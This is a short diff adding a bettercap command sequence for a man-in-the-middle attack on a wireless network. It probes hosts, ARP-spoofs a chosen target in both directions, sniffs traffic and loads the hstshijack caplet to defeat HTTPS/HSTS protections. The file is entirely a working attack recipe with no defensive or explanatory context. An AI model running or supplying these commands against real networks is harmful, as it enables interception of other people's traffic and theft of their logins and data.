@@ -1,0 +1,8 @@
+bettercap -iface wlan0
+net.probe on
+net.show
+set arp.spoof.fullduplex true
+set arp.spoof.targets (target ip from 3 step)
+arp.spoof on
+Net.sniff on
+hstshijack/hstshijack
